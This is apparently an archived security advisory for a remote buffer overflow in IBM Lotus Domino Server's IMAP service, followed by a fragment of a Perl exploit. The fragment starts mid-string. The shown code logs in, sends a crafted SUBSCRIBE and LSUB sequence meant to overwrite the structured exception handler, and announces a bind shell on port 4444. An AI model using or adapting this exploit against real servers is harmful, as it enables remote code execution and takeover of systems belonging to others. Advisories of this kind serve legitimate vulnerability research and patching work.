source: http://www.securityfocus.com/bid/26219/info

IBM Lotus Domino Server is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial of service.

An exploit is available for Lotus Domino Server running on Windows platforms. It is not known if other platforms are affected.

This issue may be related to the IMAP buffer-overflow vulnerability described in BID 26176.

Error: Invalid username or password!\n";
    exit;
}

print "[+] Successfully logged in.\n".
      "[+] Trying to overwrite and control the SE handler...\n";

$sock->send( "a002 SUBSCRIBE {" . length( $mailbox ) . "}\r\n" );
$sock->recv( $recv, 1024 );
$sock->send( "$mailbox\r\n" );
$sock->recv( $recv, 1024 );
$sock->send( "a003 LSUB arg1 arg2\r\n" );
sleep( 3 );
close( $sock );

print "[+] Done. Now check for a bind shell on $ip:4444!\n";

